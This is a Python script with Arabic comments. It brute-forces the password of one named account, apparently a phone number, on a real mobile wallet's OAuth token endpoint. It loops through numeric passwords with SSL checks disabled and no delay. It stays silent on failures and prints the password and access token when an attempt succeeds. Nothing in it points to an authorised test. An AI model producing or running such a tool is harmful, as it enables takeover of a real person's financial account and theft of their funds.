import requests
import time
from requests.exceptions import RequestException

# إلغاء تحذيرات SSL
requests.packages.urllib3.disable_warnings()

# الإعدادات الأساسية
BASE_URL = "https://app.jawali-ye.com.ye:8473/walletmobileproxy/"
ENDPOINT = "oauth/token"
FULL_URL = BASE_URL + ENDPOINT

BASE_DATA = {
    "grant_type": "password",
    "client_id": "restapp",
    "client_secret": "restapp",
    "username": "777893643",
    "scope": "openid"
}

initial_password = 0
MAX_ATTEMPTS = 5000000000000000000000000  # يُفضل تغييره إلى رقم معقول (مثلاً 10000)

def get_access_token():
    current_password = initial_password

    for attempt in range(1, MAX_ATTEMPTS + 1):
        data = BASE_DATA.copy()
        data["password"] = str(current_password)

        try:
            response = requests.post(FULL_URL, data=data, verify=False, timeout=10)

            if response.status_code == 200:
                json_response = response.json()
                # ✅ طباعة النجاح مع كلمة المرور الصحيحة
                print("✅ تم الحصول على التوكن بنجاح!")
                print(f"🔐 كلمة المرور الصحيحة: {current_password}")   # <-- الجديد
                print(f"📦 الرد الكامل: {json_response}")
                print(f"🔑 التوكن: {json_response.get('access_token')}")
                print(f"⏳ ينتهي بعد: {json_response.get('expires_in')} ثانية")
                return json_response
            else:
                # ❌ فشل – لا نطبع شيئاً (صامت)
                pass

        except RequestException:
            # ❌ خطأ في الاتصال – لا نطبع شيئاً (صامت)
            pass

        # زيادة كلمة المرور للمحاولة التالية
        current_password += 1
        time.sleep(0.0)  # تأخير صغير جداً (يمكن إلغاؤه)

    # بعد انتهاء جميع المحاولات دون نجاح
    print("❌ فشلت جميع المحاولات (بعد زيادة password عدة مرات).")
    return None

if __name__ == "__main__":
    token_data = get_access_token()
    if token_data:
        print("✅ البوت يعمل بنجاح.")
    else:
        print("❌ تعذر الحصول على التوكن.")
